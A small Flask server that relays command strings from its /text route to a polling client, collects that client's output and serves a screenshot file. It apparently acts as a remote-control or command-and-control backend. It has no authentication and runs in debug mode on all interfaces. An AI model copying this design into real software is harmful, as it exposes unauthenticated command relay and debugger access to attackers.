from flask import Flask, render_template, jsonify, request, redirect, send_file
import os

app = Flask(__name__)

lastButtonPress = 0
rec_text = ""
output = ""

total_output = []

#def load_image():
#	img_dir = "static"
#	img_list = os.listdir(img_dir)
#	img_path = os.path.join(img_dir, str(img_list))
#	return img_path

@app.route("/")
def main():
	return render_template('index.html')

@app.route('/text', methods=['GET'])
def received_text():
	global rec_text
	rec_text = request.args.get('command')
	return redirect("/", code=302)

@app.route('/see_text')
def seetext():
	global rec_text
	temp = rec_text
	rec_text = ""
	return str(temp)

@app.route('/output_text', methods=['GET'])
def output():
	global output
	global total_output
	output = request.args.get('output')
	total_output.append(output)
	return redirect("/", code=302)

@app.route('/see_output')
def show_output():
	return total_output

@app.route('/clear_output')
def clear_output():
	global total_output
	total_output.clear()
	return redirect("/", code=302)

@app.route('/image_output')
def show_screenshots():
#	image = load_image()
	return send_file("static/screenshot.png", mimetype='image/png')

if __name__ == "__main__":
	 app.run(host="0.0.0.0", port=5000, debug=True) #this is so we dont have to do the specialized initiation command

